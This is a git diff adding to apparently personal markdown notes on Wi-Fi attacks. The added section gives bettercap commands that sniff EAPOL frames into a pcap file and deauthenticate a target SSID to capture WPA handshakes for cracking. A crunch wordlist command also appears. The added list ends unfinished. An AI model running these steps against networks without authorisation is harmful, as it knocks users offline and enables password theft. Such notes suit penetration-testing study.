@@ -20,6 +20,7 @@ Finding weaknesses in Wifi networks and exploiting vulnerabilities in their encr
 - WASH
 - aireplay-ng
 - Crunch
+- bettercap
 
 ### Steps for WAP
 
@@ -124,5 +125,24 @@ crunch 1 3 abc123 -o test_wordlist.txt
 cat test_worklist.txt
 ```
 
+### Another way to get WPA passcodes (Wireless Access with Bettercap on Kali Linux) - four way handshake
 
+- Change the wireless adapter to monitor mode
+- activate bettercap -iface and activate net.recon
+- activate wifi.recon and can see the access points of the environment we are sniffing by using **wifi.show**
+- then we activate some other modules
+```bash
+set net.sniff.verbose true
+set net.sniff.filter ether proto 0x888e
+set net.sniff.output wpa.pcap
+```
+- We the deauth the SSID we want
+``` bash
+wifi.deauth <SSID of the wifi network>
+```
+
+- We wait until we see hanshakes are captured by bettercap
+- 
+
+ 
 ￼
